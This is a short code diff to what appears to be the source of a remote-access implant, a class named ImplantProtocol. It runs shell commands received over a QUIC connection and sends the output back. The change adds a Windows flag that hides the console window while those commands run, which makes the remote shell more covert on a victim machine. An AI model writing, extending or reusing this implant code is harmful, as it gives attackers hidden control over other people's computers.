@@ -217,9 +217,13 @@ class ImplantProtocol(QuicConnectionProtocol):
             # ── regular shell command ─────────────────────────────────────────
             else:
                 run = f"cmd.exe /c {cmd}" if IS_WINDOWS else cmd
+                kw = {}
+                if IS_WINDOWS:
+                    kw["creationflags"] = getattr(
+                        subprocess, "CREATE_NO_WINDOW", 0x08000000)
                 result = subprocess.run(
                     run,
-                    shell=True, capture_output=True, text=True, timeout=15)
+                    shell=True, capture_output=True, text=True, timeout=15, **kw)
                 output = result.stdout + result.stderr or "(no output)"
                 self._send(sid, output)
 
